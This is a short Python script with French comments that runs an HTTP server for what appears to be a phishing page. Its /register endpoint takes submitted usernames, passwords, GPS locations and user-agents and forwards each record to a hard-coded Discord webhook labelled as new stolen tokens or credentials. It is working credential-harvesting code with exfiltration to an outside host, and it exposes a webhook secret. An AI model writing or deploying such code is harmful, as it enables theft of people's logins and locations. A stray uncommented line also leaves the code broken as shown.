from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import datetime
import urllib.request

WEBHOOK_URL = "https://discord.com/api/webhooks/1532553921095270530/dP3FzsnWbetZfkPN3HuRAKDY_xNCgfNekonHwEPoE4F_MQRmA-6v6-BC5hWbmBc2mmWK"

class MyHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/register':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))

            # Affichage dans la console
            print("[+] Nouvelles données reçues :", data)

            # Horodatage de la réception
            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # Envoi vers Discord
            msg = f"--- NOUVEAU TOKEN / IDENTIFIANT [{now}] ---\nUtilisateur : {data.get('username')}\nMot de passe : {data.get('password')}\nGPS : {data.get('location')}\nUser-Agent : {data.get('userAgent')}"
            payload = json.dumps({"content": msg}).encode('utf-8')
            req = urllib.request.Request(WEBHOOK_URL, data=payload, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'})
            try:
                urllib.request.urlopen(req)
            except Exception as e:
                print("Erreur envoi Discord:", e)

            # Réponse JSON envoyée au navigateur
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
        else:
            self.send_error(404, "Page non trouvée")

Lancement du serveur
server_address = ('', 8080)
httpd = HTTPServer(server_address, MyHandler)
print("Serveur lancé avec succès sur le port 8080...")
httpd.serve_forever()
